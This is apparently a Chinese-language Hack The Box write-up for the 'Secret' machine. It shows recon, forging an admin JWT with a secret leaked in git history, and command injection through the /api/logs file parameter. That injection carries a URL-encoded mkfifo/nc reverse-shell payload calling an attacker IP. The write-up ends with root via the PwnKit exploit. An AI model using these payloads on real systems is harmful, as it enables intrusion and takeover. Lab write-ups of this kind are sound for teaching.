###### tags: `Hack the box` `HTB` `Easy` `Linux`

# Secret
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.161.168 -u 5000 -t 8000 --scripts -- -n -Pn -sVC 

Open 10.129.161.168:22
Open 10.129.161.168:80
Open 10.129.161.168:3000

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc+UtqNVYIrxJx+2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK+oAgE7wbv++el2WeD1DF8gw+GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe+TsG/8O/GFgNXU1WqFYGe4xl+MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V+NQ/7EJYJPMeugOtbputyZMH+jALhzxBs07JLbw8Bh9JX+ZJl/j6VcIDfFRXxB7ceSe/cp4UYWcLqN+AsoE7k+uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY+DgpVElkr0vVa+3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0+oeMOlJN+k=
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa+8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0=
|   256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr+32BQ9R/2lS/Mu33ExJwsci
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)
|_http-title: DUMB Docs
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`ffuf`掃
```
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -u http://10.129.161.168:3000/FUZZ -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt

download                [Status: 301, Size: 183, Words: 7, Lines: 11, Duration: 353ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 12872, Words: 5267, Lines: 266, Duration: 352ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 12872, Words: 5267, Lines: 266, Duration: 353ms]
docs                    [Status: 200, Size: 20720, Words: 6752, Lines: 487, Duration: 323ms]
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 320ms]
api                     [Status: 200, Size: 93, Words: 12, Lines: 1, Duration: 322ms]
Docs                    [Status: 200, Size: 20720, Words: 6752, Lines: 487, Duration: 322ms]
API                     [Status: 200, Size: 93, Words: 12, Lines: 1, Duration: 320ms]
DOCS                    [Status: 200, Size: 20720, Words: 6752, Lines: 487, Duration: 321ms]
                        [Status: 200, Size: 12872, Words: 5267, Lines: 266, Duration: 322ms]
```

查看`http://10.129.161.168:3000/docs`有一些`api`的使用方式

```
POST http://localhost:3000/api/user/register 

{
        "name": "dasith",
	"email": "root@dasith.works",
	"password": "Kekc8swFgD6zU"
}
```

```
POST http://localhost:3000/api/user/login 

{
	"email": "root@dasith.works",
	"password": "Kekc8swFgD6zU"
}
```

最後的`/api/priv`可以看到如果是`admin`的話會顯示是`admin`，如果是`normal`會顯示`normal user`
```
Access Private Route

GET http://localhost:3000/api/priv 


{
	"role": {
		"role": "you are admin",
		"desc": "this is only for admin"
	}
}

{
	"role": {
		"role": "you are normal user",
		"desc": "user name"
	}
}
```

![Secret_1.png](picture/Secret_1.png)


先註冊一個新帳號看看，用[postman](https://nitish08.medium.com/postman-setup-on-kali-linux-5073000cfc88)
```
{
        "name": "admin123",
	"email": "admin123@gmail.com",
	"password": "admin123"
}
```

![Secret_2.png](picture/Secret_2.png)

登入

![Secret_3.png](picture/Secret_3.png)

```
  {
	"email": "admin123@gmail.com",
	"password": "admin123"
  }


eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2N2FkNTViNzgxYjczODA0NzY3MWJmY2YiLCJuYW1lIjoiYWRtaW4xMjMiLCJlbWFpbCI6ImFkbWluMTIzQGdtYWlsLmNvbSIsImlhdCI6MTczOTQxNDc4M30.Vrj65xv4W1vW81Q1KWQzUKeg05Sc8f1ZXK_QBOUcCrI
```

丟[jwt.io](https://jwt.io/)

![Secret_4.png](picture/Secret_4.png)

查看`http://10.129.144.245:3000/`可以看到一個下載`source code`的頁面

![Secret_5.png](picture/Secret_5.png)

載下來之後進到`local-web`可以看到裡面有`.git`資料夾
```
┌──(kali㉿kali)-[~/Downloads/local-web]
└─$ ls -al

total 116
drwxrwxr-x   8 kali kali  4096 Sep  3  2021 .
drwxr-xr-x   4 kali kali  4096 Feb 12 04:55 ..
-rw-rw-r--   1 kali kali    72 Sep  3  2021 .env
drwxrwxr-x   8 kali kali  4096 Sep  8  2021 .git
-rw-rw-r--   1 kali kali   885 Sep  3  2021 index.js
drwxrwxr-x   2 kali kali  4096 Aug 13  2021 model
drwxrwxr-x 201 kali kali  4096 Aug 13  2021 node_modules
-rw-rw-r--   1 kali kali   491 Aug 13  2021 package.json
-rw-rw-r--   1 kali kali 69452 Aug 13  2021 package-lock.json
drwxrwxr-x   4 kali kali  4096 Sep  3  2021 public
drwxrwxr-x   2 kali kali  4096 Sep  3  2021 routes
drwxrwxr-x   4 kali kali  4096 Aug 13  2021 src
-rw-rw-r--   1 kali kali   651 Aug 13  2021 validations.js

┌──(kali㉿kali)-[~/Downloads/local-web]
└─$ git log   
commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
Author: dasithsv <dasithsv@gmail.com>
Date:   Thu Sep 9 00:03:27 2021 +0530

    now we can view logs from server 😃

commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

commit de0a46b5107a2f4d26e348303e76d85ae4870934
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:29:19 2021 +0530

    added /downloads

commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:27:35 2021 +0530

    removed swap

commit 3a367e735ee76569664bf7754eaaade7c735d702
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:26:39 2021 +0530

    added downloads

commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:25:52 2021 +0530

    first commit
```

查看`git log`最上面的紀錄，可以看到user`theadmin`是admin帳號，且有一個`/logs`，可對`file`參數進行注入
```
┌──(kali㉿kali)-[~/Downloads/local-web]
└─$ git show e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
Author: dasithsv <dasithsv@gmail.com>
Date:   Thu Sep 9 00:03:27 2021 +0530

    now we can view logs from server 😃

diff --git a/routes/private.js b/routes/private.js
index 1347e8c..cf6bf21 100644
--- a/routes/private.js
+++ b/routes/private.js
@@ -11,10 +11,10 @@ router.get('/priv', verifytoken, (req, res) => {
     
     if (name == 'theadmin'){
         res.json({
-            role:{
-
-                role:"you are admin", 
-                desc : "{flag will be here}"
+            creds:{
+                role:"admin", 
+                username:"theadmin",
+                desc : "welcome back admin,"
             }
         })
     }
@@ -26,7 +26,32 @@ router.get('/priv', verifytoken, (req, res) => {
             }
         })
     }
+})
+
 
+router.get('/logs', verifytoken, (req, res) => {
+    const file = req.query.file;
+    const userinfo = { name: req.user }
+    const name = userinfo.name.name;
+    
+    if (name == 'theadmin'){
+        const getLogs = `git log --oneline ${file}`;
+        exec(getLogs, (err , output) =>{
+            if(err){
+                res.status(500).send(err);
+                return
+            }
+            res.json(output);
+        })
+    }
+    else{
+        res.json({
+            role: {
+                role: "you are normal user",
+                desc: userinfo.name.name
+            }
+        })
+    }
 })
 
 router.use(function (req, res, next) {
@@ -40,4 +65,4 @@ router.use(function (req, res, next) {
 });
 
 
-module.exports = router
\ No newline at end of file
+module.exports = router
```

再來看`removed .env for security reasons`這個log可以看到一個`token secret`，應該是`signature`
```
┌──(kali㉿kali)-[~/Downloads/local-web]
└─$ git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
```

透過[jwt.io](https://jwt.io/)可以改成

![Secret_6.png](picture/Secret_6.png)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2N2FkNTViNzgxYjczODA0NzY3MWJmY2YiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRoZWFkbWluQGdtYWlsLmNvbSIsImlhdCI6MTczOTQxNDc4M30.LWZLs7EoCaYSB_YCtpoPd_ZF5_aC54s17Od9C4goHKM
```

透過上面的範例對`/api/priv`進行`GET`請求，可以確認是`admin`權限

![Secret_7.png](picture/Secret_7.png)

再對`/api/logs`進行`GET`請求

![Secret_8.png](picture/Secret_8.png)


我們對`file`進行注入
```
http://10.129.144.245:3000/api/logs?file=;id
```

![Secret_9.png](picture/Secret_9.png)

開啟`nc`準備`reverse`等反彈，成功後可在`/home/dasith`得user.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4444

http://10.129.144.245:3000/api/logs?file=;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.14.36%204444%20%3E%2Ftmp%2Ff

dasith@secret:~/local-web$
dasith@secret:~/local-web$ cd /home/dasith
dasith@secret:~$ cat user.txt
e67a9f35a99c88e6f9a4900d2daa8465
```

用`linpeas`
```
dasith@secret:/tmp$ wget 10.10.14.36/linpeas.sh
dasith@secret:/tmp$ chmod +x linpeas.sh
dasith@secret:/tmp$ ./linpeas.sh

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                
[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

用[CVE-2021-4034](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py)得root之後，在`/root`得root.txt
```
dasith@secret:/tmp$ python3 CVE-2021-4034.py
id
uid=0(root) gid=1000(dasith) groups=1000(dasith)
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@secret:/tmp# cd /root
root@secret:/root# cat root.txt
e54a6b6e46e943bdf54849f82a5596aa
```


